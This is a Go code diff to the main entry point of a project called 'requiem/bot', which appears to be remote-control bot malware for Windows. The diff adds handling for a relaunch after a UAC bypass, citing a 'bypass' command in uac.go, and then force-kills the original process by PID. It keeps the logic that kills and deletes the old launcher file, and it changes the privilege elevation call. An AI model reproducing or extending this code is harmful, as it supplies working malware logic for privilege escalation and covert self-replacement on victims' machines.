@@ -5,6 +5,7 @@ import (
 	"os"
 	"path"
 	"path/filepath"
+	"strconv"
 	"time"
 
 	"requiem/bot"
@@ -24,35 +25,46 @@ func main() {
 	defer utils.RemoveMutex()
 
 	store.InitState()
+	utils.DebugLog("\n")
 
 	args := os.Args
+	utils.DebugLog(fmt.Sprintf("all args - %v", args))
+
 	if len(args) > 1 && args[1] == store.LAUNCH_KEY {
 		if len(args) == 3 {
-			path := args[2]
-			path = filepath.Clean(path)
+			oldThing := args[2]
 
-			info, err := os.Stat(path)
-			if err != nil {
-				return
-			}
+			_, err := strconv.Atoi(oldThing)
+			if err == nil {
+				// the 3rd arg is a pid when it bypasses uac
+				// see /bot/commands/uac.go @ if utils.HasFlag(content, "bypass") {
+				utils.RunCommand("taskkill", "/f", "/pid", oldThing)
+			} else {
+				path := filepath.Clean(oldThing)
 
-			if info.IsDir() {
-				return
-			}
-
-			err = utils.RunCommand("taskkill", "/F", "/IM", filepath.Base(path))
-			if err != nil {
-				utils.DebugLog(fmt.Sprintf("failed to kill launch exec - %s", err))
-			}
-
-			for i := range DELETE_OLD_FILE_MAX_RETRIES {
-				err = os.Remove(path)
-				if err == nil {
-					break
+				info, err := os.Stat(path)
+				if err != nil {
+					return
 				}
 
-				utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %s", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
-				time.Sleep(500 * time.Millisecond)
+				if info.IsDir() {
+					return
+				}
+
+				err = utils.RunCommand("taskkill", "/f", "/im", filepath.Base(path))
+				if err != nil {
+					utils.DebugLog(fmt.Sprintf("failed to kill launch exec - %s", err))
+				}
+
+				for i := range DELETE_OLD_FILE_MAX_RETRIES {
+					err = os.Remove(path)
+					if err == nil {
+						break
+					}
+
+					utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %s", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
+					time.Sleep(500 * time.Millisecond)
+				}
 			}
 		}
 
@@ -63,7 +75,7 @@ func main() {
 	}
 
 	if store.REQUIRE_ADMIN && !store.IsAdmin {
-		funcs.Elevate()
+		funcs.ElevateWithConfig()
 	}
 
 	var newDir string
